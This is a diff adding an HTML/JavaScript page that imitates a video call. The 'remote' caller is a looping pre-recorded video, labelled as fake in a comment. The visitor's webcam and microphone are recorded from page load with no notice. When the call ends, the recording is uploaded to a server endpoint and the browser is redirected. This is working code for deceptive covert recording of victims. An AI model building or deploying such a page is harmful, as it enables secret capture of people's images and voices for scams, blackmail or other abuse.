@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Calling</title>
+<link rel="icon" href="favicon.png">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body { margin:0; background:black; overflow:hidden; }
+
+#remoteVideo {
+    position:fixed;
+    width:100%;
+    height:100%;
+    object-fit:cover;
+}
+
+#localVideo {
+    position:absolute;
+    width:200px;
+    bottom:100px;
+    right:20px;
+    border:2px solid white;
+    border-radius:10px;
+}
+
+.controls {
+    position:absolute;
+    bottom:20px;
+    width:100%;
+    display:flex;
+    justify-content:center;
+    gap:10px;
+}
+
+button {
+    padding:10px;
+    border:none;
+    border-radius:20px;
+    background:#222;
+    color:white;
+    cursor:pointer;
+}
+
+.end { background:red; }
+</style>
+</head>
+
+<body>
+
+<!-- Fake remote -->
+<video id="remoteVideo" autoplay loop muted playsinline>
+    <source src="test-video.mp4" type="video/mp4">
+</video>
+
+<!-- Your cam -->
+<video id="localVideo" autoplay muted playsinline></video>
+
+<div class="controls">
+    <button onclick="toggleMic()">Mic</button>
+    <button onclick="toggleCamera()">Cam</button>
+    <button onclick="switchCamera()">Switch</button>
+    <button class="end" onclick="endCall()">End</button>
+</div>
+
+<script>
+let localStream;
+let mediaRecorder;
+let recordedChunks = [];
+let currentFacing = "user";
+
+const localVideo = document.getElementById("localVideo");
+
+async function startCamera() {
+    localStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: currentFacing },
+        audio: true
+    });
+
+    localVideo.srcObject = localStream;
+
+    startRecording();
+}
+
+function startRecording() {
+    const stream = localStream;
+    recordedChunks = [];
+
+    // 🔥 Pick a working mime type automatically
+    let mimeType = "";
+
+    if (MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")) {
+        mimeType = "video/webm;codecs=vp9,opus";
+    } else if (MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus")) {
+        mimeType = "video/webm;codecs=vp8,opus";
+    } else if (MediaRecorder.isTypeSupported("video/webm")) {
+        mimeType = "video/webm";
+    } else {
+        alert("Your browser does not support video recording properly");
+        return;
+    }
+
+    console.log("Using mimeType:", mimeType);
+
+    mediaRecorder = new MediaRecorder(stream, { mimeType });
+
+    mediaRecorder.ondataavailable = e => {
+        if (e.data.size > 0) recordedChunks.push(e.data);
+    };
+
+    mediaRecorder.onstop = async () => {
+        const blob = new Blob(recordedChunks, { type: mimeType });
+
+        console.log("Blob size:", blob.size);
+
+        if (blob.size === 0) {
+            alert("Recording failed (empty video)");
+            return;
+        }
+
+        const formData = new FormData();
+        formData.append("video", blob, "call.webm");
+
+        try {
+            await fetch("http://localhost:3000/upload", {
+                method: "POST",
+                body: formData
+            });
+
+            console.log("Upload complete");
+        } catch (err) {
+            console.error("Upload failed:", err);
+        }
+
+        window.location.href = "search.html";
+    };
+
+    mediaRecorder.start(1000);
+}
+
+function toggleMic() {
+    const track = localStream.getAudioTracks()[0];
+    track.enabled = !track.enabled;
+}
+
+function toggleCamera() {
+    const track = localStream.getVideoTracks()[0];
+    track.enabled = !track.enabled;
+}
+
+async function switchCamera() {
+    currentFacing = currentFacing === "user" ? "environment" : "user";
+
+    localStream.getTracks().forEach(t => t.stop());
+    await startCamera();
+}
+
+function endCall() {
+    console.log("Ending call...");
+
+    if (mediaRecorder && mediaRecorder.state !== "inactive") {
+        mediaRecorder.stop();
+    }
+}
+
+startCamera();
+</script>
+
+</body>
+</html>
